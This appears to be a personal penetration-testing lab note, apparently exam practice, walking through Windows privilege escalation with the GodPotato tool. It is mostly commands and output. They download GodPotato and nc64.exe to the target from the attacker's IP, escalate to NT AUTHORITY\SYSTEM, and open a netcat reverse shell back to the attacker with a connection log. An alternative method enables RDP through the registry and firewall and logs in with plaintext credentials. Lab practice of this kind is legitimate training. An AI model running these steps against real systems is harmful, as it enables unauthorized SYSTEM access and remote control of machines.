https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer#godpotato

# Execute commands with elevated permission cmd  
Listen
```
┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
└─$ rlwrap ncat -nvlp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

Local location
```
┌──(kali㉿kali)-[~/OSCP-A]
└─$ ls -lh /home/kali/tools/GodPotato 
total 288K
-rw-rw-r-- 1 kali kali  131 Sep 23 14:58 app.config
-rw-rw-r-- 1 kali kali 8.9K Sep 23 14:58 ArgsParse.cs
-rw-rw-r-- 1 kali kali 2.5K Sep 23 14:58 GodPotato.csproj
-rw-rw-r-- 1 kali kali  441 Sep 23 14:58 GodPotato.csproj.user
-rw-rw-r-- 1 kali kali  56K Sep 23 15:02 GodPotato-NET2.exe
-rw-rw-r-- 1 kali kali  56K Sep 23 15:02 GodPotato-NET35.exe
-rw-rw-r-- 1 kali kali  56K Sep 23 15:02 GodPotato-NET4.exe
drwxrwxr-x 2 kali kali 4.0K Sep 23 14:58 images
-rw-rw-r-- 1 kali kali  12K Sep 23 14:58 LICENSE
drwxrwxr-x 2 kali kali 4.0K Sep 23 14:58 NativeAPI
-rw-rw-r-- 1 kali kali 4.8K Sep 23 14:58 Program.cs
drwxrwxr-x 2 kali kali 4.0K Sep 23 14:58 Properties
-rw-rw-r-- 1 kali kali 2.8K Sep 23 14:58 README.md
-rw-rw-r-- 1 kali kali  58K Sep 23 14:58 SharpToken.cs
```

```
iwr -uri http://192.168.45.175/GodPotato-NET35.exe -OutFile god.exe
```

Test
```
PS C:\temp> ./godpotato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140722932219904
[*] DispatchTable: 0x140722934670776
[*] UseProtseqFunction: 0x140722934002800
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\c83ebf4c-83e4-4176-aef8-09ef54d2c5a3\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0be8-ffff-aca9-fe0c3c0a0817
[*] DCOM obj OXID: 0x94200938707c77c
[*] DCOM obj OID: 0x87aacf467e687085
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 916 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3020
```

## Prepare reverse shell using netcat
Getting netcat to the folder of attacking
```
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ ls /home/kali/tools/netcat                      
nc64.exe  nc.exe  netcat.c
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ mv /home/kali/tools/netcat/nc64.exe /attackFolder/.
```

```
iwr -uri http://192.168.45.175/nc64.exe -OutFile nc64.exe
```

Listen
```
rlwrap ncat -nvlp 4444   
```

```
┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
└─$ rlwrap ncat -nvlp 4444      
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.156.141:52443.
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Get a reverse shell using netcat and godpotato
Execute reverse using netcat
```
./god.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.175 4444"
```

```
PS C:\temp> ./god.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.175 4444"
```

## Stabilize the shell with [[printspoofer]]
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

## Another method:
- God potatoes to create a new admin user 
- Enable RDP. 

```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
```

```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Testing
```
xfreerdp /cert-ignore /compression /auto-reconnect /u:dave /p:Password123 /v:192.168.156.141 /w:1600 /h:800
```